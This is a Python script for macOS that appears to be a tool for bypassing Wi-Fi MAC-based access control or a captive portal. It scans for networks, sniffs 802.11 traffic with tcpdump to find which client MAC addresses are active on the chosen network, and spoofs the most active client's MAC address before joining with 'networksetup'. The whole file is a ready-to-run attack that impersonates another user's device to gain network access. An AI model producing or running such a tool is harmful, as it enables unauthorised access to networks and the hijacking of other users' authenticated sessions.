import time
from scapy.all import *
import subprocess as sub
import argparse
import re
import os


IGNORE_MAC = ('ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:')
AIRPORT = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"
TCPDUMP = "/usr/sbin/tcpdump"




def change_mac_addr_macos(interface, new_mac):
    print('\n[+] Changing the MAC Address to', new_mac)
    sub.call(['sudo', '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-z'])
    time.sleep(2)
    sub.call(['sudo', 'ifconfig', interface, 'lladdr', new_mac])
    print('[+] MAC Address changed to', new_mac)
    
def list_wifis_macos():
    scan_cmd = sub.Popen(['sudo', 'airport', '-s'], stdout=sub.PIPE, stderr=sub.STDOUT)
    scan_out, scan_err = scan_cmd.communicate()
    scan_out_data = {}
    scan_out_lines = str(scan_out).split("\\n")[1:-1]
    for each_line in scan_out_lines:
        split_line = [e for e in each_line.split(" ") if e != ""]
        line_data = {"SSID": split_line[0], "BSSID": split_line[1], "channel": split_line[3], "HT": (split_line[4] == "Y"), "security": split_line[5]}
        scan_out_data[split_line[1]] = line_data
    return scan_out_data
        

def scan_clients(bssids, interface):
    animation = "|/-\\"
    idx = 0
    good_packets = 0
    stop = False
    file_name = "test"+str(time.time()).replace(".", "") + ".pcap"
    packet_count = 200
    sub.check_call([AIRPORT, "--disassociate"])
    clients_and_count = {}
    print('[+] Capturing Network Traffic...')
    print('[+] Packet Limit: ', packet_count)
    print('[+] If it takes more than a minute, CTRL+C to stop')
    pcap = None
    p = sub.Popen((['sudo', TCPDUMP, '-I', '-n', '-e', '-i' , interface, '-w', file_name]), stdout=sub.PIPE, stderr=sub.PIPE)
    while pcap is None:
        try:
            pcap = PcapReader(file_name)
        except:
            "Waiting for packets..."
    try:
        while p is not None and not stop:
            if good_packets > packet_count:
                print("\n[+] Stopping capture.")
                # killall -9 tcpdump
                sub.Popen(['sudo', 'killall', '-9', 'tcpdump']).wait()
                stop = True        
            for packet in pcap:
                if Dot11 in packet:
                    if not packet.addr1 or not packet.addr2:
                        continue
                    else:
                        addr1 = packet.addr1.lower()
                        addr2 = packet.addr2.lower()
                        if addr1 in IGNORE_MAC or addr2 in IGNORE_MAC or (addr1 not in bssids and addr2 not in bssids):
                            continue
                        else:     
                            if addr1 in bssids:
                                if not addr2 in clients_and_count:
                                    clients_and_count[addr2] = 1
                                else:
                                    clients_and_count[addr2] += 1                           
                                    good_packets += 1
                            elif addr2 in bssids:
                                if addr1 not in clients_and_count:
                                    clients_and_count[addr1] = 1
                                else:
                                    clients_and_count[addr1] += 1
                                    good_packets += 1
                idx = (idx + 1) % len(animation)
                c = animation[idx]
                print(f"\r[+] Capturing packets... {c}", end="", flush=True)
    except KeyboardInterrupt:
        print("\n[+] Stopping capture.")
        sub.Popen(['sudo', 'killall', '-9', 'tcpdump']).wait()
        stop = True
    time.sleep(1)
    clients_and_count = sorted(clients_and_count.items(), key=lambda x: x[1], reverse=True)
    for client in clients_and_count:
        print("Mac: ", client[0], " Count: ", client[1])
    return clients_and_count

def select_interface():
    print('\n[+] Selecting the interface...')
    interfaces = sub.check_output(['ifconfig'])
    interfaces = interfaces.decode('utf-8')
    interfaces = interfaces.split('\n')
    interfaces = [i for i in interfaces if re.search('^[a-zA-Z]', i)]
    interfaces = [i.split(' ')[0] for i in interfaces]
    interfaces = [i for i in interfaces if not re.search('lo', i)]
    print('[+] Interfaces found:', interfaces)
    interface = input('[+] Enter the interface to change its MAC Address: ')
    while True:
        if interface in interfaces:
            break
        else:
            print('[+] Interface not found!')
            interface = input('[+] Enter the interface to change its MAC Address: ')
    print('[+] Interface selected:', interface)
    return interface

def auto_mode(interface):
    print('\n[+] Auto Bypass Started...')
    channels = set()
    bssids = set()
    wifi_list = list_wifis_macos()
    for wifi in wifi_list:
        print("Number: ","SSID: ", wifi_list[wifi]['SSID'], " BSSID: ", wifi_list[wifi]['BSSID'], " Channel: ", wifi_list[wifi]['channel'], " HT: ", wifi_list[wifi]['HT'], " Security: ", wifi_list[wifi]['security'])
    ssid = input("Enter the ssid of the network you want to scan: ")
    for wifi in wifi_list:
        if wifi_list[wifi]["SSID"] == ssid:
            print("Added: ", wifi_list[wifi]["BSSID"])
            bssids.add(wifi_list[wifi]["BSSID"])
            channels.add(wifi_list[wifi]["channel"])
    clients = scan_clients(bssids, interface)
    if len(clients) == 0:
        print("No clients found")
        return
    selected_client = clients[0]
    print(type(selected_client[0]))
    print("[+] Selected client: ", selected_client)
    change_mac_addr_macos(interface, selected_client[0])
    sub.check_output(["sudo", "networksetup", "-setairportnetwork", interface, ssid])
    print("[+] Connected to network: ", ssid)
    print("[+] Bypass completed, enjoy!")
    

def main():
    operating_system = sub.check_output(['uname'])
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Interface to change its MAC Address')
    args = parser.parse_args()
    if not args.interface:
        print('[+] Interface not provided')
        exit()
    else:
        interface = args.interface
    if not operating_system.decode('utf-8').__contains__('Darwin'):
        print('[+] Operating System not supported!')
        exit()
    if os.geteuid() != 0:
        print('[+] Please run as root!')
        exit()
    auto_mode(interface)
    
    
if __name__ == '__main__':
    main()
    
